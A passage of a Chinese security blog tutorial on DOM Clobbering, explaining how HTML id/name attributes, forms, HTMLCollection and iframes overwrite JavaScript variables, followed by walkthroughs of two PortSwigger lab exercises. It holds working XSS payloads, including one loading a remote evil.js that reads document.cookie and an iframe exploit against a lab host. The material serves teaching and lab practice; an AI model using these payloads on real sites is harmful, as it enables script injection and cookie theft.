<p>​    可以发现前端页面插入了这样一条标签数据。（这里需要注意的就是，在对<code>a</code>和<code>area</code>标签对应对象调用<code>toString</code>方法的时候，<code>href</code>的值需要给出一个<code>URL</code>，如果是字符串的话，默认会添加服务器前缀）</p>
<p>由于<code>script</code>标签是可以跨域进行访问的，如果我在远端服务器上写入一个恶意的<code>JS</code>代码，就可以进行<code>XSS</code>攻击，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 远端写入恶意js代码:http://122.112.137.72/evil.js</span><br><span class="line">alert(document.cookie);</span><br></pre></td></tr></table></figure>

<p>然后传入<code>payload</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;h id=&quot;m1sn0w&quot;&gt;&lt;a id=&quot;value&quot; href=&quot;http://122.112.137.72/evil.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213111701217.png" alt="image-20211213111701217"></p>
<p>​    这里不能直接传入恶意代码，即在<code>value</code>值中写入恶意代码，因为这里不能直接对<code>src</code>中的属性值进行闭合。</p>
<p>​    在实际的业务场景下，例如留言板之类的功能点，由于服务端的一些过滤规则，导致部分标签的数据值会被移除，比如<code>onclick</code>，<code>onerror</code>之类的。在这种情况下，如果不能直接执行<code>JS</code>代码，可以考虑使用<code>DOM Clobbering</code>进行攻击。（因为只需要传入正常的<code>HTML</code>标签，导致变量覆盖就可以进行利用）</p>
<h3 id="多层级变量覆盖"><a href="#多层级变量覆盖" class="headerlink" title="多层级变量覆盖"></a>多层级变量覆盖</h3><p>​    在实际的前端<code>JS</code>代码中，我们可能会遇到这种情况：<code>windows.m1sn0w.log</code>即多层级的变量调用。那么在这种情况下，如何通过修改<code>HTML</code>标签来进行影响呢？</p>
<h4 id="利用HTML层级标签"><a href="#利用HTML层级标签" class="headerlink" title="利用HTML层级标签"></a>利用<code>HTML</code>层级标签</h4><p>​    <code>form</code>标签就具有这种层级关系，可以使用<code>form[name]</code>或者<code>form[id]</code>来调用<code>form</code>标签下的子标签，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; &gt;</span><br><span class="line">        &lt;input id=&quot;a&quot;  /&gt;</span><br><span class="line">        &lt;button name=&quot;b&quot;&gt;</span><br><span class="line">        &lt;a id=&quot;c&quot; &gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    console.log(m1sn0w.b)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​    这里可以输出<code>m1sn0w.a</code>和<code>m1sn0w.b</code>，但是<code>m1sn0w.c</code>输出是<code>undefined</code>，这也就存在一个小问题，就是不能通过<code>form</code>标签来获取<code>a</code>标签所对应的对象，也就会导致最后在进行<code>toString</code>方法调用的时候，其值我们不能进行控制。</p>
<p>​    但是如果前端代码是这样的<code>m1sn0w.a.name</code>或者<code>m1sn0w.a.value</code>这种调用的话，也仍然可以构造<code>HTML</code>标签，让其值为一个字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;m1sn0w&quot; &gt;</span><br><span class="line">	&lt;input id=&quot;a&quot; name=&quot;d&quot; value=&quot;value&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>​    以上会分别输出字符串<code>d</code>和字符串<code>value</code>值。</p>
<p>​    可能在实际的场景下，<code>username</code>和<code>password</code>这两个变量值更常见，可以利用<code>URL</code>的格式来进行变量的覆盖，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;m1sn0w&quot; href=&quot;http://username:password@127.0.0.1&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    这时，如果我访问<code>m1sn0w.username</code>，会直接返回上面的<code>username</code>字符串；同理，访问<code>m1sn0w.passsord</code>也一样。除此之外，利用<code>ftp</code>协议，也可以达到同样的目的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;m1sn0w&quot; href=&quot;ftp:username:password@127.0.0.1&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="利用HTMLCollection"><a href="#利用HTMLCollection" class="headerlink" title="利用HTMLCollection"></a>利用<code>HTMLCollection</code></h4><p>​    当存在多个<code>id</code>相同值的时候，会打印出<code>HTMLCollection</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    console.log(m1sn0w)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​    以上这种情况，会输出<code>HTMLCollection</code>。（但是在<code>firefox</code>浏览器下，该值返回的是第一个<code>a</code>标签，也就是说，这种利用是有一定的条件的，根据浏览器的不同，可能返回的结果也有不同）</p>
<p>​    如何通过<code>HTMLCollection</code>，来覆盖多层级条件下的变量值。在官方文档<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=oJ1D9O7zC0G75p5HJAHdwg==.T4rCz1iHvWimdD5Z91o+czTLNUDdOaR605ps3xoNK1qejunOuBk3USCf14JgL4OBGSqABLjZ4Up+FDJKTShbFg==">4.2.10.2. Interface HTMLCollection</a>中指出，可以利用层级元素中的<code>id</code>或者<code>name</code>属性来确定调用哪个<code>Collection</code>，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; name=&quot;one&quot;&gt;&lt;/a&gt;</span><br><span class="line">    &lt;a id=&quot;m1sn0w&quot; name=&quot;two&quot;&gt;&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>​    如果我想要指定返回的是第二个<code>a</code>标签，我可以这样进行调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(m1sn0w.two);</span><br></pre></td></tr></table></figure>

<p>​    也就是说，可以构造相同<code>id</code>属性值的<code>HTML</code>标签，然后指定确定的<code>name</code>属性，就可以指定想要调用的那个标签。</p>
<p>​    利用<code>HTML</code>层级标签加上<code>HTMLCollection</code>，可以实现更多层的变量覆盖，例如，想要覆盖<code>m1sn0w.username.name.value</code>，那么可以如下进行构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot;&gt;&lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; name=&quot;username&quot;&gt;</span><br><span class="line">        &lt;input id=&quot;name&quot; value=&quot;m1sn0w&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    console.log(m1sn0w.username.name.value)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213131921607.png" alt="image-20211213131921607"></p>
<h4 id="利用iframe标签"><a href="#利用iframe标签" class="headerlink" title="利用iframe标签"></a>利用<code>iframe</code>标签</h4><p>​    如果想要覆盖掉更多层级的变量，可以使用<code>iframe</code>标签。比如前面已经实现了4级变量的覆盖，如果现在需要覆盖5层变量，即<code>totle.m1sn0w.username.name.value</code>，可以使用如下方式：（当给一个<code>iframe</code>标签指定了<code>name</code>属性之后，就可以利用这个<code>name</code>属性，指向<code>iframe</code>里面的<code>window</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe name=&quot;totle&quot; srcdoc=&#x27;&lt;form id=&quot;m1sn0w&quot;&gt;&lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; name=&quot;username&quot;&gt;</span><br><span class="line">        &lt;input id=&quot;name&quot; value=&quot;m1sn0w&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;&#x27;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      console.log(totle.m1sn0w.username.name.value) </span><br><span class="line">    &#125;, 500)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    由于<code>iframe</code>标签不是同步加载的，因此要设置<code>setTimeout</code>才能获取到值，那么有没有什么方法可以不适用<code>setTimeout</code>就可以直接获取值呢？这里解决的思路就是有没有一种方式，可以产生一个短暂的延时，等待<code>iframe</code>标签加载完，因此可以利用导入样式表，导致其有一小段时间的延迟：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe name=&quot;totle&quot; srcdoc=&#x27;&lt;form id=&quot;m1sn0w&quot;&gt;&lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;m1sn0w&quot; name=&quot;username&quot;&gt;</span><br><span class="line">        &lt;input id=&quot;name&quot; value=&quot;m1sn0w&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;&#x27;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;style&gt;@import &#x27;//m1sn0w.top&#x27;;&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">      console.log(totle.m1sn0w.username.name.value) </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    这样，就不需要利用<code>setTimeout</code>来等待<code>iframe</code>标签加载完毕，而可以直接获取元素属性值了。</p>
<p>​    如果想要实现更多层级的变量覆盖，可以尝试在<code>iframe</code>标签中的<code>srcdoc</code>中嵌套<code>iframe</code>标签。</p>
<h2 id="PortSwigger-lab实践"><a href="#PortSwigger-lab实践" class="headerlink" title="PortSwigger lab实践"></a><code>PortSwigger lab</code>实践</h2><p>​    在<code>PortSwigger</code>中提供了两个实验，可以通过实践的方式，加深对<code>DOM Clobbering</code>的理解：</p>
<h3 id="Exploiting-DOM-clobbering-to-enable-XSS"><a href="#Exploiting-DOM-clobbering-to-enable-XSS" class="headerlink" title="Exploiting DOM clobbering to enable XSS"></a>Exploiting DOM clobbering to enable XSS</h3><p>​    这个实验有一个留言板，将用户输入的内容，最后以<code>HTML</code>的方式，呈现在前端界面，查看一下关键的<code>js</code>代码，简单分析一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"># js代码</span><br><span class="line">function loadComments(postCommentPath) &#123;</span><br><span class="line">    let xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = function() &#123;</span><br><span class="line">        if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">            let comments = JSON.parse(this.responseText);</span><br><span class="line">            displayComments(comments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.open(&quot;GET&quot;, postCommentPath + window.location.search);</span><br><span class="line">    xhr.send();</span><br><span class="line"></span><br><span class="line">    function escapeHTML(data) &#123;</span><br><span class="line">        return data.replace(/[&lt;&gt;&#x27;&quot;]/g, function(c)&#123;</span><br><span class="line">            return &#x27;&amp;#&#x27; + c.charCodeAt(0) + &#x27;;&#x27;;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function displayComments(comments) &#123;</span><br><span class="line">        let userComments = document.getElementById(&quot;user-comments&quot;);</span><br><span class="line"></span><br><span class="line">        for (let i = 0; i &lt; comments.length; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            comment = comments[i];</span><br><span class="line">            let commentSection = document.createElement(&quot;section&quot;);</span><br><span class="line">            commentSection.setAttribute(&quot;class&quot;, &quot;comment&quot;);</span><br><span class="line"></span><br><span class="line">            let firstPElement = document.createElement(&quot;p&quot;);</span><br><span class="line"></span><br><span class="line">            let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class="line">            let avatarImgHTML = &#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">            let divImgContainer = document.createElement(&quot;div&quot;);</span><br><span class="line">            divImgContainer.innerHTML = avatarImgHTML</span><br><span class="line"></span><br><span class="line">            if (comment.author) &#123;</span><br><span class="line">                if (comment.website) &#123;</span><br><span class="line">                    let websiteElement = document.createElement(&quot;a&quot;);</span><br><span class="line">                    websiteElement.setAttribute(&quot;id&quot;, &quot;author&quot;);</span><br><span class="line">                    websiteElement.setAttribute(&quot;href&quot;, comment.website);</span><br><span class="line">                    firstPElement.appendChild(websiteElement)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author)</span><br><span class="line">                firstPElement.innerHTML = newInnerHtml</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (comment.date) &#123;</span><br><span class="line">                let dateObj = new Date(comment.date)</span><br><span class="line">                let month = &#x27;&#x27; + (dateObj.getMonth() + 1);</span><br><span class="line">                let day = &#x27;&#x27; + dateObj.getDate();</span><br><span class="line">                let year = dateObj.getFullYear();</span><br><span class="line"></span><br><span class="line">                if (month.length &lt; 2)</span><br><span class="line">                    month = &#x27;0&#x27; + month;</span><br><span class="line">                if (day.length &lt; 2)</span><br><span class="line">                    day = &#x27;0&#x27; + day;</span><br><span class="line"></span><br><span class="line">                dateStr = [day, month, year].join(&#x27;-&#x27;);</span><br><span class="line"></span><br><span class="line">                let newInnerHtml = firstPElement.innerHTML + &quot; | &quot; + dateStr</span><br><span class="line">                firstPElement.innerHTML = newInnerHtml</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            firstPElement.appendChild(divImgContainer);</span><br><span class="line"></span><br><span class="line">            commentSection.appendChild(firstPElement);</span><br><span class="line"></span><br><span class="line">            if (comment.body) &#123;</span><br><span class="line">                let commentBodyPElement = document.createElement(&quot;p&quot;);</span><br><span class="line">                commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);</span><br><span class="line"></span><br><span class="line">                commentSection.appendChild(commentBodyPElement);</span><br><span class="line">            &#125;</span><br><span class="line">            commentSection.appendChild(document.createElement(&quot;p&quot;));</span><br><span class="line"></span><br><span class="line">            userComments.appendChild(commentSection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    当完成留言以后，访问相应留言界面，就会触发这个函数：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211213144438507.png" alt="image-20211213144438507"></p>
<p>​    也就是说，这里将整个页面的<code>HTML</code>都传入了<code>displayComments</code>这个函数。在<code>displayComments</code>这个函数中，它获取了所有<code>id</code>为<code>user-comments</code>的元素，然后在每个元素下面，生成了一些特点标签。</p>
<p>​    <code>DOM Clobbering</code>不能覆盖掉已有的变量。在<code>displayComments</code>函数中，可以看到<code>window.defaultAvatar</code>这个变量，我们主要对该变量进行一个覆盖，从而控制<code>JS</code>中的<code>defaultAvatar</code>变量，达到<code>XSS</code>的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class="line"></span><br><span class="line">let avatarImgHTML = &#x27;&lt;img class=&quot;avatar&quot; src=&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>​    以上就是存在漏洞点的两行代码，第二行代码进行了一个字符串拼接的操作。因此，这里的利用思路就是，首先设置<code>window.defaultAvatar</code>值，然后还需要指定<code>avatar</code>值，构造payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=defaultAvatar&gt;</span><br><span class="line">&lt;a id=defaultAvatar name=avatar href=&quot;1&amp;quot; onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    最后拼接完成以后的字符串即为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;1&quot; onerror=alert(1)//&quot; name=&quot;avatar&quot; id=&quot;defaultAvatar&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Clobbering-DOM-attributes-to-bypass-HTML-filters"><a href="#Clobbering-DOM-attributes-to-bypass-HTML-filters" class="headerlink" title="Clobbering DOM attributes to bypass HTML filters"></a>Clobbering DOM attributes to bypass HTML filters</h3><p>​    在<code>resources/js/htmlJanitor.js</code>中，有如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (var a = 0; a &lt; node.attributes.length; a += 1) &#123;</span><br><span class="line">    var attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">    if (shouldRejectAttr(attr, allowedAttrs, node)) &#123;</span><br><span class="line">      node.removeAttribute(attr.name);</span><br><span class="line">      // Shift the array to continue looping.</span><br><span class="line">      a = a - 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里通过一个<code>for</code>循环，除去一些黑名单中的属性元素。从整个代码来看，<code>node</code>属性值是可以控制的，也就是说，传入的数据值，可以通过覆盖掉<code>attributes</code>值，从而绕过这个<code>for</code>循环，达到了<code>bypass</code>的目的。</p>
<p>​    例如传入一下<code>payload</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=m1sn0w tabindex=0 onfocus=alert(1)&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>

<p>然后访问：<code>https://ac601fff1e547796c0224f7300ed00be.web-security-academy.net/post?postId=7#m1sn0w</code>即可触发弹窗。（利用<code>tabindex</code>和<code>onfocus</code>属性，可以使用锚点的方式进行触发）。根据实验的要求，需要调用<code>print()</code>函数，因此构造以下<code>payload</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=m1sn0w tabindex=0 onfocus=print()&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>

<p>​    最终在<code>exploit</code>中提交<code>iframe</code>标签进行漏洞的利用，即可完成实验：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=https://ac601fff1e547796c0224f7300ed00be.web-security-academy.net/post?postId=8 onload=&quot;setTimeout(()=&gt;this.src=this.src+&#x27;#m1sn0w&#x27;,500)&quot;&gt;</span><br></pre></td></tr></table></figure>



<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​    相比于传统的<code>XSS</code>漏洞，<code>DOM Clobbering</code>更加巧妙。其利用<code>HTML</code>标签元素去影响<code>JS</code>中的变量，从而达到一些绕过安全策略的限制。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>【DOM Clobbering 的原理及应用】<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000040098609">https://segmentfault.com/a/1190000040098609</a></p>
<p>【DOM Clobbering strikes back】<a target="_blank" rel="noopener" href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
<p>【DOM破坏攻击学习】<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1664107945038899101&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1664107945038899101&amp;wfr=spider&amp;for=pc</a></p>

  </div>
</article>



      </div>
      
       <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E2%80%94Dom-Clobbering"><span class="toc-number">1.</span> <span class="toc-text">前端安全—Dom Clobbering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dom-Clobbering%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Dom Clobbering介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#id%E5%B1%9E%E6%80%A7%E5%80%BC%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">id属性值的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%A0%87%E7%AD%BE%E7%9A%84name%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.2.</span> <span class="toc-text">特殊标签的name属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E6%AE%8A%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="toc-number">1.1.3.</span> <span class="toc-text">toString方法的特殊返回值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-Clobbering%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">DOM Clobbering攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">简单示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E5%B1%82%E7%BA%A7%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">多层级变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8HTML%E5%B1%82%E7%BA%A7%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">利用HTML层级标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8HTMLCollection"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">利用HTMLCollection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8iframe%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">利用iframe标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PortSwigger-lab%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.3.</span> <span class="toc-text">PortSwigger lab实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-DOM-clobbering-to-enable-XSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">Exploiting DOM clobbering to enable XSS</span></a></li><li class="toc-item 